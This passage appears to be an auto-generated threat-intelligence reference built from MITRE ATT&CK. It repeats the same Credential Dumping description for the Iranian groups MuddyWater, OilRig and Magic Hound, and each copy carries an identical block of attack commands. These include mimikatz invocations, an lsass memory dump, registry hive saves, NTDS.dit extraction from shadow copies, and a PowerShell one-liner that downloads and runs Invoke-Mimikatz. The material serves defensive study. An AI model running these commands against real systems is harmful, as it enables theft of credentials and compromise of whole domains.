The following tools can be used to enumerate credentials:

* [Windows Credential Editor](https://attack.mitre.org/software/S0005)
* [Mimikatz](https://attack.mitre.org/software/S0002)

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

#### DCSync

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

### Linux

#### Proc filesystem

The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.
```

## Technique Commands

```
hashdump
mimikatz !lsadump::sam
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
use mimikatz
wdigest
msv
kerberos
logonpasswords
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
gsecdump -a
wce -o output.txt
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
ntdsutil "ac i ntds" "ifm" "create full C:\Atomic_Red_Team" q q
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
findstr /S cpassword %logonserver%\sysvol\*.xml
. $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose
ntdsutil.exe
\\Windows\\.+\\lsass.exeHKLM\SAM|HKLM\Security
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
powershell/collection/ChromeDump
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
python/situational_awareness/network/dcos/etcd_crawler
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Credential Dumping

## Technique Description

```
Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### Windows

#### SAM (Security Accounts Manager)

The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)

Notes:
Rid 500 account is the local, in-built administrator.
Rid 501 is the guest account.
User accounts start with a RID of 1,000+.

#### Cached Credentials

The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
Cached credentials for Windows Vista are derived using PBKDF2.

#### Local Security Authority (LSA) Secrets

With SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.
 
When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.
Windows 10 adds protections for LSA Secrets described in Mitigation.

#### NTDS from Domain Controller

Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)
 
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Group Policy Preference (GPP) Files

Group Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"
* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

Notes:
On the SYSVOL share, the following can be used to enumerate potential XML files.
dir /s * .xml

#### Service Principal Names (SPNs)

See [Kerberoasting](https://attack.mitre.org/techniques/T1208).

#### Plaintext Credentials

After a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.

SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.

The following SSPs can be used to access credentials:

Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)
Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)
 
The following tools can be used to enumerate credentials:

* [Windows Credential Editor](https://attack.mitre.org/software/S0005)
* [Mimikatz](https://attack.mitre.org/software/S0002)

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

#### DCSync

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

### Linux

#### Proc filesystem

The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.
```

## Technique Commands

```
hashdump
mimikatz !lsadump::sam
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
use mimikatz
wdigest
msv
kerberos
logonpasswords
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
gsecdump -a
wce -o output.txt
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
ntdsutil "ac i ntds" "ifm" "create full C:\Atomic_Red_Team" q q
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
findstr /S cpassword %logonserver%\sysvol\*.xml
. $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose
ntdsutil.exe
\\Windows\\.+\\lsass.exeHKLM\SAM|HKLM\Security
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
powershell/collection/ChromeDump
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
python/situational_awareness/network/dcos/etcd_crawler
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Credential Dumping

## Technique Description

```
Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### Windows

#### SAM (Security Accounts Manager)

The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)

Notes:
Rid 500 account is the local, in-built administrator.
Rid 501 is the guest account.
User accounts start with a RID of 1,000+.

#### Cached Credentials

The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
Cached credentials for Windows Vista are derived using PBKDF2.

#### Local Security Authority (LSA) Secrets

With SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.
 
When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques.

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.

Notes:
The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.
Windows 10 adds protections for LSA Secrets described in Mitigation.

#### NTDS from Domain Controller

Active Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)
 
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy

#### Group Policy Preference (GPP) Files

Group Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"
* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

Notes:
On the SYSVOL share, the following can be used to enumerate potential XML files.
dir /s * .xml

#### Service Principal Names (SPNs)

See [Kerberoasting](https://attack.mitre.org/techniques/T1208).

#### Plaintext Credentials

After a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.

SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.

The following SSPs can be used to access credentials:

Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)
Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)
 
The following tools can be used to enumerate credentials:

* [Windows Credential Editor](https://attack.mitre.org/software/S0005)
* [Mimikatz](https://attack.mitre.org/software/S0002)

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

#### DCSync

DCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)

### Linux

#### Proc filesystem

The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.
```

## Technique Commands

```
hashdump
mimikatz !lsadump::sam
hashdump
run hashdump
run smart_hashdump
post/windows/gather/credentials/domain_hashdump
logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
use mimikatz
wdigest
msv
kerberos
logonpasswords
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
gsecdump -a
wce -o output.txt
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp
ntdsutil "ac i ntds" "ifm" "create full C:\Atomic_Red_Team" q q
vssadmin.exe create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
findstr /S cpassword %logonserver%\sysvol\*.xml
. $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
Get-GPPPassword -Verbose
ntdsutil.exe
\\Windows\\.+\\lsass.exeHKLM\SAM|HKLM\Security
\\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
powershell/collection/ChromeDump
powershell/collection/ChromeDump
powershell/collection/FoxDump
powershell/collection/FoxDump
powershell/collection/ninjacopy
powershell/collection/ninjacopy
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/add_keepass_config_trigger
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/find_keepass_config
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/get_keepass_config_trigger
powershell/collection/vaults/keethief
powershell/collection/vaults/keethief
powershell/collection/vaults/remove_keepass_config_trigger
powershell/collection/vaults/remove_keepass_config_trigger
powershell/credentials/enum_cred_store
powershell/credentials/enum_cred_store
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/cache
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/command
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/dcsync_hashdump
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/extract_tickets
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/golden_ticket
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/logonpasswords
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/lsadump
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/mimitokens
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/sam
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/silver_ticket
powershell/credentials/mimikatz/trust_keys
powershell/credentials/mimikatz/trust_keys
powershell/credentials/powerdump
powershell/credentials/powerdump
powershell/credentials/vault_credential
powershell/credentials/vault_credential
powershell/management/downgrade_account
powershell/management/downgrade_account
powershell/management/wdigest_downgrade
powershell/management/wdigest_downgrade
powershell/privesc/gpp
powershell/privesc/gpp
powershell/privesc/mcafee_sitelist
powershell/privesc/mcafee_sitelist
python/collection/linux/hashdump
python/collection/linux/hashdump
python/collection/linux/mimipenguin
python/collection/linux/mimipenguin
python/collection/osx/hashdump
python/collection/osx/hashdump
python/collection/osx/kerberosdump
python/collection/osx/kerberosdump
python/management/multi/kerberos_inject
python/management/multi/kerberos_inject
python/situational_awareness/network/dcos/etcd_crawler
python/situational_awareness/network/dcos/etcd_crawler
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Credential Dumping

## Technique Description

```
Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### Windows

#### SAM (Security Accounts Manager)

The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.
 
A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe 
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

